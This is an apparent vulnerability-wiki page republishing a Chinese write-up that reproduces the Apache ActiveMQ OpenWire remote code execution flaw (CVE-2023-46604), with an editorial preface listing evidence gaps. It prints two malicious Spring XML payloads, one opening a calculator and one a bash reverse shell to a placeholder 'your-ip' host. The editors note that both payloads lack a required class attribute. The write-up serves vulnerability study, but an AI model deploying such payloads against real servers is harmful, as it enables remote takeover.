---
source: "MrWQ/vulnerability-paper"
title: "Apache ActiveMQ RCE 漏洞复现（附 EXP）"
product: "Apache ActiveMQ OpenWire"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2023-46604"
referenced_identifiers: ""
identifier_role: "primary"
cve: "CVE-2023-46604"
prerequisites: "受影响OpenWire端口可达、可取远程SpringXML、classpath可用；PoC JDK11是作者工具要求"
source_url: "https://mp.weixin.qq.com/s/TiOSeATAKIkeHgPrw3-geg"
source_status: "recorded"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-16bd2e97108bf811f023265a"
entity_id: "ve-16bd2e97108bf811f023265a"
schema_version: "1"
---

# Apache ActiveMQ RCE 漏洞复现（附 EXP）

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：受影响OpenWire端口可达、可取远程SpringXML、classpath可用；PoC JDK11是作者工具要求
- 证据范围：两个XML的bean均缺class=ProcessBuilder，给出的文本不能实现声称计算器/反弹；实际Java工具未公开正文

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 缺主CVE元数据；四个<版本应按分支界定
- 必须JDK11不是漏洞固有条件，需分工具与目标JVM
- XML关键class属性缺失，公众号回复获取EXP不可当已具备代码
- 最近/很久等无发布日期语境，完整接管应限服务权限

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TiOSeATAKIkeHgPrw3-geg)

ActiveMQ 是一个开源的消息代理和集成模式服务器，它支持 Java 消息服务 (JMS) API。它是 Apache Software Foundation 下的一个项目，用于实现消息中间件，帮助不同的应用程序或系统之间进行通信。

一. 漏洞描述

ActiveMQ 对传入的 TCP 数据没有进行校验。攻击者可构造特殊数据流在服务端加载任意类，最终能直接执行任意命令，接管 ActiveMQ 服务器。

二. 影响范围

ActiveMQ < 5.15.16、ActiveMQ < 5.16.7、ActiveMQ < 5.17.6、ActiveMQ < 5.18.3

三. 漏洞复现

这个漏洞其实已经出来很久了，前段时间没有人爆出来 poc 而已，最近又突然爆出来了。

把 poc 导入到 idea 中，这个 poc 必须使用 jdk11 才行。

![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ11AXWvpWYYJSnpAG8ommHPv4LdvibLX9WJUle3UKwiaoRV4DribKlUuB14a8eow5RvBHv61OG7jk8SXw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ11AXWvpWYYJSnpAG8ommHPvfMuaaVT0t3bacWCX0K6n5ZfowcVXBHxuJ8jwKHzEFuEBCuPSGKgtgQ/640?wx_fmt=png)

恶意的 xml 如下：

这个是测试弹计算器的  
  

```
<?xml version="1.0" encoding="UTF-8" ?>
  <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean init-method="start">
      <constructor-arg >
        <list>
            <value>open</value>
            <value>-a</value>
            <value>calculator</value>
        </list>
      </constructor-arg>
    </bean>
  </beans>

```

这个是弹 shell 的

```
<?xml version="1.0" encoding="UTF-8" ?>
  <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans
http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean init-method="start">
      <constructor-arg >
        <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[bash -i >& /dev/tcp/your-ip/8080 0>&1]]></value>
        </list>
      </constructor-arg>
    </bean>
  </beans>

```

然后在 xml 文件的目录下起一个 Python 服务，如下：

![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ11AXWvpWYYJSnpAG8ommHPv8ftTLscpEx3jPs5V5ZGUaPLicRGiae2gKicEa7l8WibEicyEib1GUxotgg3g/640?wx_fmt=png)

然后去运行 main.java 文件，成功弹出计算器。

![](https://mmbiz.qpic.cn/mmbiz_png/aYLtCGDrJ11AXWvpWYYJSnpAG8ommHPvCrAaYhkKJ1Oq7Y0iat8zOh0ibo5IeZD6QhoStbXzWkxCpzrMYibPvPwAw/640?wx_fmt=png)

其他师傅写的漏洞代码分析很不错很详细推荐

https://mp.weixin.qq.com/s/4n7vyeXLtim0tXcjnSWDAw  

四. 漏洞修复

目前官方已发布最新版本，建议受影响的用户及时更新升级到最新版本。链接如下：https://github.com/apache/activemq/tags

技术文章仅供参考学习，请勿使用本文中所提供的任何技术信息或代码工具进行非法测试和违法行为。若使用者利用本文中技术信息或代码工具对任何计算机系统造成的任何直接或者间接的后果及损失，均由使用者本人负责。本文所提供的技术信息或代码工具仅供于学习，一切不良后果与文章作者无关。使用者应该遵守法律法规，并尊重他人的合法权益。

**获取漏洞利用工具公众号回复 "MQ"，是大写的 MQ 哦![](https://res.wx.qq.com/t/wx_fed/we-emoji/res/v1.3.10/assets/newemoji/LetMeSee.png)**

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
